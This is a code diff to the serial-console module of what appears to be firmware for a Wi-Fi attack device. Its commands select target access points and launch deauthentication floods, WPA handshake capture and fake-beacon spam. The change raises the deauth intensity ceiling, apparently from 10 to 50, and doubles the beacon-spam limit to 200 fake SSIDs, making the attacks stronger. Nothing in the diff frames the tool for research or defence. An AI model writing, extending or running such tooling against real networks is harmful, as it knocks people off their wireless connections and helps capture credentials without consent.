@@ -29,6 +29,7 @@
 #include "webserver.h"        /* WEBSERVER_EVENTS, attack_request_t */
 #include "wifi_controller.h"  /* scan + AP records */
 #include "attack.h"           /* attack_get_status, attack_stop_current, types */
+#include "attack_method.h"    /* DEAUTH_INTENSITY_MAX */
 
 static const char *TAG = "serial_console";
 
@@ -141,10 +142,10 @@ static int cmd_clear(int argc, char **argv) {
 }
 
 static int cmd_intensity(int argc, char **argv) {
-    if (argc < 2) { printf("intensity = %u (1..10)\r\n", s_intensity); return 0; }
+    if (argc < 2) { printf("intensity = %u (1..%d)\r\n", s_intensity, DEAUTH_INTENSITY_MAX); return 0; }
     int v = atoi(argv[1]);
     if (v < 1) v = 1;
-    if (v > 10) v = 10;
+    if (v > DEAUTH_INTENSITY_MAX) v = DEAUTH_INTENSITY_MAX;
     s_intensity = (uint8_t) v;
     printf("intensity set to %u\r\n", s_intensity);
     return 0;
@@ -164,7 +165,7 @@ static int cmd_deauth(int argc, char **argv) {
     uint8_t method = parse_deauth_method(mname);
     if (method == 0xFF) { printf("method must be: bssid | normal | multiclone | targeted\r\n"); return 1; }
     uint8_t inten = s_intensity;
-    if (argc >= 3) { int v = atoi(argv[2]); if (v >= 1 && v <= 10) inten = (uint8_t) v; }
+    if (argc >= 3) { int v = atoi(argv[2]); if (v >= 1 && v <= DEAUTH_INTENSITY_MAX) inten = (uint8_t) v; }
     post_attack(ATTACK_TYPE_DOS, method, 0, 0, inten, true);
     printf("Deauth started: method=%s, intensity=%u, %u target(s). Type 'stop' to end.\r\n",
            mname, inten, s_sel_count);
@@ -197,7 +198,7 @@ static int cmd_beacon(int argc, char **argv) {
     int count = 20;
     if (argc >= 2) count = atoi(argv[1]);
     if (count < 1) count = 1;
-    if (count > 100) count = 100;
+    if (count > 200) count = 200;
     uint8_t mode = (argc >= 3) ? parse_beacon_mode(argv[2]) : 0;
     post_attack(ATTACK_TYPE_BEACON_SPAM, (uint8_t) count, mode, 0, s_intensity, false);
     printf("Beacon spam started: %d fake SSIDs, mode=%u. Type 'stop' to end.\r\n", count, mode);
@@ -297,7 +298,7 @@ void serial_console_start(void) {
     register_command("select",    "Select target AP(s) by index: select <idx> [idx...]", cmd_select);
     register_command("targets",   "Show the currently selected targets",                 cmd_targets);
     register_command("clear",     "Clear the target selection",                          cmd_clear);
-    register_command("intensity", "Get/set deauth intensity 1..10: intensity [n]",       cmd_intensity);
+    register_command("intensity", "Get/set deauth intensity 1..50: intensity [n]",       cmd_intensity);
     register_command("deauth",    "Deauth: deauth <bssid|normal|multiclone|targeted> [intensity]", cmd_deauth);
     register_command("handshake", "WPA handshake capture: handshake <bssid|normal|silent>", cmd_handshake);
     register_command("beacon",    "Beacon spam: beacon <count> <common|random|rickroll|security>", cmd_beacon);
